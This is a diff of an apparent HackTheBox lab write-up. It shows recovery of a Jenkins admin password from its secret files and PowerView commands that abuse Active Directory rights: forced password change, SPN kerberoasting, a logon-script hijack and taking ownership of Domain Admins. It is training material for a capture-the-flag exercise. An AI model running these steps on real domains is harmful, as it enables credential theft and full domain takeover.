@@ -20,6 +20,8 @@ Jenkins is popular CI/CD pipeline product. We can create projects and set trigge
 
 ![](https://i.imgur.com/xImlMlr.png)
 
+We can set a schedule to trigger the build. Minimum period is 1 minute so one command per minute.
+
 ![](https://i.imgur.com/eDbrigY.png)
 
 ![](https://i.imgur.com/PqY13by.png)
@@ -29,8 +31,7 @@ Jenkins is popular CI/CD pipeline product. We can create projects and set trigge
 We need three files to recover the admin user's password. `master.key` `hudson.util.Secret` and `config.xml` or `credentials.xml` file. In our case, last item will be `config.xml` of admin user. 
 
 
-
-After some enumerations, you will find full paths for those files below,
+After some enumerations, we find full paths like below for those files.
 
 ```
 c:\users\oliver\AppData\Local\Jenkins\.jenkins\secrets\hudson.util.Secret
@@ -179,7 +180,7 @@ Pretty straight forward
 
 #### Abusing ForceChangePassword
 
-We need [PowerView.ps1](https://github.com/PowerShellMafia/PowerSploit/blob/master/Recon/PowerView.ps1)
+We need [PowerView.ps1](https://github.com/PowerShellMafia/PowerSploit/blob/master/Recon/PowerView.ps1) for necessary functions.
 
 ```
 upload /opt/PowerView.ps1
@@ -199,18 +200,19 @@ Set-DomainUserPassword -Identity smith -AccountPassword $UserPassword
 To abuse GenericWrite, we have 2 options. One, we can set a service principal name and we can kerberoast that account. Two, we can set objects like logon script which would get executed on the next time account logs in.
 
 
-So I monitored the maria's ldap entry a while and as you can see that last time she logged in was when the box had started. She did not seem to be logging in, so the first option seems the choice right ? Let's kerberoast her account.
+So I monitored the maria's ldap entry a while and as you can see that last time she logged in was when the box had started. She did not seem to be logging in, so the first option seems the correct choice right ? Let's kerberoast her account.
 
 ![](https://i.imgur.com/dwLJqEk.png)
 
 #### Kerberoasting
 
 
-It looks like krbtgt's account is kerberoastable too, I tried this one as well before but the hash is not crackable.
+It looks like krbtgt's account is kerberoastable too, I tried this one as well before, but the hash is not crackable.
 
 ![](https://i.imgur.com/D6goF2y.png)
 
 
+We can set a SPN like below,
 ```
 Import-Module .\Powerview.ps1
 $SecPassword = ConvertTo-SecureString 'Password123!' -AsPlainText -Force
@@ -238,6 +240,7 @@ We crack it and own maria you think right ? Jk lol lmao said htb. They actually 
 
 #### Setting the logon script
 
+We can set a logon script like below,
 ```
 $SecPassword = ConvertTo-SecureString 'Password123!' -AsPlainText -Force
 $Cred = New-Object System.Management.Automation.PSCredential('object.local\smith', $SecPassword)
@@ -251,9 +254,10 @@ Set-DomainObject -Credential $Cred -Identity maria -SET @{scriptpath='C:\\Window
 
 ![](https://i.imgur.com/GxQRYNS.png)
 
+After looking at maria's Desktop folder, there is an excel file named Engines.xls. Let's download it.
 ![](https://i.imgur.com/TMCZMjH.png)
 
-`Engines.xls`,
+And `Engines.xls` has the password for maria,
 ![](https://i.imgur.com/OQQPGAZ.png)
 
 
@@ -261,16 +265,16 @@ Set-DomainObject -Credential $Cred -Identity maria -SET @{scriptpath='C:\\Window
 
 #### Abusing WriteOwner
 
-
+We can change the ownership of "Domain Admins" group like below,
 ```
 $SecPassword = ConvertTo-SecureString 'W3llcr4ft3d_4cls' -AsPlainText -Force;$Cred = New-Object System.Management.Automation.PSCredential('object.local\maria', $SecPassword)
 
 Set-DomainObjectOwner -Credential $Cred -Identity "Domain Admins" -OwnerIdentity maria
 ```
 
-Now the owner of the "Domain Admins" object is maria but we still can't add our users to "Domain Admins" group, we also need to give permission to that.
+Now the owner of the "Domain Admins" object is maria but we still can't add our users to "Domain Admins" group. We also need to give permission to that.
 
-We can check it ussing bloodhound and as you can see that we now own the "Domain Admins".
+We can check it using bloodhound as well and as you can see that we now own the "Domain Admins".
 ![](https://i.imgur.com/tYqrH2C.png)
 
 Let's give all rights to maria
